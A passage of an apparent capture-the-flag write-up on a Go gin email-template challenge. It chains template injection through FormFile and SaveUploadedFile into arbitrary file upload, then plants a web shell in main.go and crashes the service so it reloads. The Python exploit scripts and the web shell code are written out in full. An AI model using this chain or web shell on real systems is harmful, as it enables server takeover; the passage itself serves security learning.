</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>.</span><span class=nf>Header</span><span class=p>().</span><span class=nf>Set</span><span class=p>(</span><span class=s>&#34;Content-Disposition&#34;</span><span class=p>,</span> <span class=s>`attachment; filename=&#34;`</span><span class=o>+</span><span class=nx>filename</span><span class=o>+</span><span class=s>`&#34;`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>.</span><span class=nf>Header</span><span class=p>().</span><span class=nf>Set</span><span class=p>(</span><span class=s>&#34;Content-Disposition&#34;</span><span class=p>,</span> <span class=s>`attachment; filename*=UTF-8&#39;&#39;`</span><span class=o>+</span><span class=nx>url</span><span class=p>.</span><span class=nf>QueryEscape</span><span class=p>(</span><span class=nx>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>http</span><span class=p>.</span><span class=nf>ServeFile</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>,</span> <span class=nx>filepath</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Let&rsquo;s upload the following template:</p><pre tabindex=0><code>{{ .c.FileAttachment &#34;/flag.txt&#34; &#34;exfil&#34; }}
</code></pre><p>Previewing our template, we see the following error in our local server&rsquo;s logs:</p><pre tabindex=0><code>template: preview.html:1:5: executing &#34;preview.html&#34; at &lt;.c.FileAttachment&gt;: can&#39;t call method/function &#34;FileAttachment&#34; with 0 results
</code></pre><p>After some troubleshooting, I end up reading the crucial parts of the documentation of <code>text/template</code> regarding calling methods:</p><pre tabindex=0><code>The result is the value of invoking the method with dot as the
receiver, dot.Method(). Such a method must have one return value (of
any type) or two return values, the second of which is an error.
If it has two and the returned error is non-nil, execution terminates
and an error is returned to the caller as the value of Execute.
</code></pre><p><code>FileAttachment</code> has no return value, thus we get an error. We need to explore more and now we know the following requirements:</p><ol><li>The function must have one return value or two if the second one is an <code>error</code></li><li>The function must perform some &ldquo;exploitable&rdquo; action.</li><li>The function must use argument types we can provide since we cannot create arbitrary types from a template.</li></ol><h2 id=the-vulnerability-1>The Vulnerability</h2><p>After a lot of trial and error, one function looked interesting:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=c1>// SaveUploadedFile uploads the form file to specific dst.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>Context</span><span class=p>)</span> <span class=nf>SaveUploadedFile</span><span class=p>(</span><span class=nx>file</span> <span class=o>*</span><span class=nx>multipart</span><span class=p>.</span><span class=nx>FileHeader</span><span class=p>,</span> <span class=nx>dst</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>src</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>file</span><span class=p>.</span><span class=nf>Open</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=nx>src</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>out</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Create</span><span class=p>(</span><span class=nx>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>defer</span> <span class=nx>out</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>Copy</span><span class=p>(</span><span class=nx>out</span><span class=p>,</span> <span class=nx>src</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><code>SaveUploadedFile</code> fills the first and second requirements as it returns one value and appears to allow arbitrary file upload. As for the third requirement, there is no way to declare a <code>*multipart.FileHeader</code> object from a template. Would there be?</p><p>Enters the <code>FormFile</code> function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=c1>// FormFile returns the first file for the provided form key.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>Context</span><span class=p>)</span> <span class=nf>FormFile</span><span class=p>(</span><span class=nx>name</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=o>*</span><span class=nx>multipart</span><span class=p>.</span><span class=nx>FileHeader</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nx>MultipartForm</span> <span class=o>==</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nf>ParseMultipartForm</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>engine</span><span class=p>.</span><span class=nx>MaxMultipartMemory</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>f</span><span class=p>,</span> <span class=nx>fh</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nx>Request</span><span class=p>.</span><span class=nf>FormFile</span><span class=p>(</span><span class=nx>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>fh</span><span class=p>,</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>FormFile</code> function fulfills the first requirement due to returning a <code>*multipart.FileHeader</code> and an <code>error</code> as second value. It also fulfills the third requirement as we can easily pass a <code>string</code> to the function. As for the second requirement, this function fetches a named file from our multipart form request which we control the contents of. Since this returns the exact type expected by <code>SaveUploadedFile</code>, this is the perfect gadget combination to achieve arbitrary file upload!</p><pre tabindex=0><code>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) .title }}
</code></pre><p>Testing locally, it works. We preview by sending a multipart form request which contains a file with the form input name <code>fish</code> and a URL query parameter <code>title</code> containg a file path. Good thing for us that the parentheses will be considered as only the first return value and not include the error.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://dev-7fe5c15819a3af65.email-template.ctf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) .title }}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;fish&#39;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;afile&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/preview?title=/example/file.txt&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></div><p>But&mldr; then what? This does not allow us to read files.</p><h2 id=the-exploitation>The Exploitation</h2><p>At this point, I could not find any other useful and usable function. We need to find a way to push this further. I did not mention it, but on the first level I explored the filesystem of the challenge server while trying to find the flag. I noticed a few things.</p><p>The root <code>/</code> directory had <code>/app/</code> which contains the challenge&rsquo;s code. The root also contained <code>/app.bk/</code> which appeared to be a copy/backup of <code>/app/</code>.</p><p>Since level 1, the challenge offered the possibility of resetting the challenge due to concerns of being hard locked. That could be done by visiting the route <code>/reset</code>. I hadn&rsquo;t noticed that route in the Go code, so it must be implemented in some other way. When exploring the filesystem, I found two PHP scripts which Apache pointed at when we visited <code>GET /reset</code> and <code>GET /source</code>.</p><p>The <code>reset.php</code> script took care of replacing the <code>/app/</code> directory with a clean copy of the backup and restarting the challenge service.</p><details><summary>/var/www/html/reset.php - Level 1</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>   <span class=mi>1</span>  <span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>          <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;sudo /usr/bin/systemctl stop email-template&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>          <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;/usr/bin/rm -rf /app/*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>          <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;/usr/bin/cp -r /app.bk/* /app/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>5</span>          <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;sudo /usr/bin/chown -R www-data: /app/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>          <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;sudo /usr/bin/systemctl start email-template&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=mi>7</span>  <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>   8  &lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=err>   9  &lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>  10  &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=err>  11          &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  12          &lt;meta http-equiv=&#34;refresh&#34; content=&#34;5; url=&#39;/&#39;&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  13          &lt;title&gt;Reset&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=err>  14  &lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=err>  15  &lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=err>  16          Resetting... Autoredirect after 5 seconds
</span></span></span><span class=line><span class=cl><span class=err>  17  &lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=err>  18  &lt;/html&gt;
</span></span></span></code></pre></div></details><p>The <code>source.php</code> script took care of showing us the contents of <code>main.go</code>. This functionality also wasnt seen in the Go code, so now it makes sense now.</p><p>My first train of thought was to try and backdoor the backup of <code>main.go</code> and reset so that we get setup a backdoored version of the challenge. This did not work as we did not have permissions to write in <code>/app.bk/</code>. Putting a PHP file in <code>/var/www/html/</code> was also not usable, due to the proxy only taking <code>reset</code> and <code>source</code>.</p><p>We could try to backdoor <code>/app/main.go</code> (which we do have permissions for) but this wouldn&rsquo;t have any changes as the program is already loaded in memory.</p><p>Since the start, I had experienced a few times where the server would crash and a message would appear that it is currently restarting, sometimes it would be in a restart loop and that is when a reset would be needed. Usually when a Go source is compiled, it is built into an <code>.exe</code>, but I did not see one in the <code>/app/</code> directory. Another way to run Go code is through a <code>go run main.go</code> command which does not create a <code>.exe</code> file. Therefore, I made a guess that the service, on restart, would perform a <code>go run main.go</code> command which would run it as it is then.</p><p>To recap:</p><ul><li>We have arbitrary file upload.</li><li>We can overwrite <code>/app/main.go</code></li><li>We can maybe get our modified version ran if the service restarts (without a full reset).</li></ul><p>One way to crash the server would be to reach one of the many calls to <code>log.Fatal</code> which is described as <code>Fatal is equivalent to Print() followed by a call to os.Exit(1)</code>. The one I ended up reaching was due to an error after calling <code>c.BindJSON(&update)</code> on line 47. To reach it, all we need to do is not send a JSON payload with <code>template</code> in it. An error will occur and the <code>log.Fatal</code> will be reached, terminating the server.</p><p>In my backdoored <code>main.go</code>, I implemented a very basic web shell on the route <code>/</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl><span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>cmd</span> <span class=o>:=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>DefaultQuery</span><span class=p>(</span><span class=s>&#34;fish&#34;</span><span class=p>,</span> <span class=s>&#34;id&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>out</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=s>&#34;sh&#34;</span><span class=p>,</span> <span class=s>&#34;-c&#34;</span><span class=p>,</span> <span class=nx>cmd</span><span class=p>).</span><span class=nf>Output</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nf>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span><span class=s>&#34;%s\n&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>c</span><span class=p>.</span><span class=nf>String</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span><span class=s>&#34;%s\n&#34;</span><span class=p>,</span> <span class=nx>out</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://dev-7fe5c15819a3af65.email-template.ctf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) &#34;/app/main.go&#34; }}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;fish&#39;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;backdoor.go&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Updates the preview template.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Triggers the rendering of our template with the provided form file</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/preview?&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Crashes server, which restarts the service.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></div><p>This ended up working although I was not too confident. Right after the CTF, I realized I could have looked into the definition of the service. Later, another player confirmed that the file <code>/etc/systemd/system/email-template.service</code> showed all the necessary information to be confident in this attack. Next time, I will be more careful as that service&rsquo;s name was mentioned in the <code>reset.php</code> script and I should have taken a look.</p><pre tabindex=0><code>[Unit]
Description=Email Template

[Service]
Type=simple
User=www-data
Group=www-data
Restart=always
RestartSec=5s
WorkingDirectory=/app/
ExecStart=/usr/local/go/bin/go run /app/main.go

[Install]
WantedBy=multi-user.target
</code></pre><p>With our webshell it is trivial to get the flag.</p><p><strong>FLAG-527afbab4c2ae6ed15d6134328b8bc05</strong></p><h1 id=level-3---just-a-regular-bypass>Level 3 - Just a Regular Bypass</h1><p>We now get access to a second website (<a href=http://dev-092f50226ea22197.email-template.ctf>http://dev-092f50226ea22197.email-template.ctf</a>). It is similar to the second one, but this time with some input filters. Code is provided again.</p><details><summary>main.go - Level 3</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-golang data-lang=golang><span class=line><span class=cl>   <span class=mi>1</span>  <span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span>
</span></span><span class=line><span class=cl>   <span class=mi>3</span>  <span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=mi>4</span>      <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>5</span>      <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>      <span class=s>&#34;regexp&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>7</span>      <span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl>   <span class=mi>8</span>
</span></span><span class=line><span class=cl>   <span class=mi>9</span>      <span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>10</span>      <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>11</span>
</span></span><span class=line><span class=cl>  <span class=mi>12</span>      <span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>13</span>  <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>14</span>
</span></span><span class=line><span class=cl>  <span class=mi>15</span>  <span class=kd>type</span> <span class=nx>Update</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>16</span>      <span class=nx>Template</span> <span class=kt>string</span> <span class=s>`json:&#34;template&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl>  <span class=mi>17</span>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>18</span>
</span></span><span class=line><span class=cl>  <span class=mi>19</span>  <span class=kd>func</span> <span class=nf>filter</span><span class=p>(</span><span class=nx>template</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=kt>bool</span><span class=p>,</span> <span class=kt>string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>20</span>      <span class=nx>r1</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*([&#34;\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>21</span>      <span class=nx>r2</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>22</span>      <span class=nx>r3</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>23</span>
</span></span><span class=line><span class=cl>  <span class=mi>24</span>      <span class=c1>// Filter everything from Context, and double quotes, equal, backtick, pipe and parenthesis to avoid bypass as well.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=mi>25</span>      <span class=nx>i</span> <span class=o>:=</span> <span class=nx>r1</span><span class=p>.</span><span class=nf>FindStringSubmatch</span><span class=p>(</span><span class=nx>template</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>26</span>      <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>0</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>27</span>          <span class=k>return</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>28</span>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>29</span>
</span></span><span class=line><span class=cl>  <span class=mi>30</span>      <span class=c1>// Make sure the default variables can&#39;t be used to bypass filter.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=mi>31</span>      <span class=k>if</span> <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.title&#34;</span><span class=p>)</span>  <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=mi>32</span>          <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.eventname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=mi>33</span>          <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.firstname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=mi>34</span>          <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.lastname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=mi>35</span>          <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.companyname&#34;</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=mi>36</span>          <span class=nx>strings</span><span class=p>.</span><span class=nf>Contains</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=s>&#34;.custom&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>37</span>
</span></span><span class=line><span class=cl>  <span class=mi>38</span>
</span></span><span class=line><span class=cl>  <span class=mi>39</span>          <span class=nx>j</span> <span class=o>:=</span> <span class=nx>r2</span><span class=p>.</span><span class=nf>FindAllString</span><span class=p>(</span><span class=nx>template</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>40</span>          <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>j</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>0</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>41</span>              <span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>v</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>j</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>42</span>                  <span class=nx>k</span> <span class=o>:=</span> <span class=nx>r3</span><span class=p>.</span><span class=nf>FindStringSubmatch</span><span class=p>(</span><span class=nx>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>43</span>                  <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nx>k</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>44</span>                      <span class=nx>l</span> <span class=o>:=</span> <span class=nx>r2</span><span class=p>.</span><span class=nf>FindStringSubmatch</span><span class=p>(</span><span class=nx>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span>                      <span class=k>return</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;Can only use &#34;</span> <span class=o>+</span> <span class=nx>l</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=s>&#34; like the following {{ &#34;</span> <span class=o>+</span> <span class=nx>l</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=s>&#34; }}&#34;</span>
</span></span><span class=line><span class=cl>  <span class=mi>46</span>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=mi>47</span>              <span class=p>}</span>
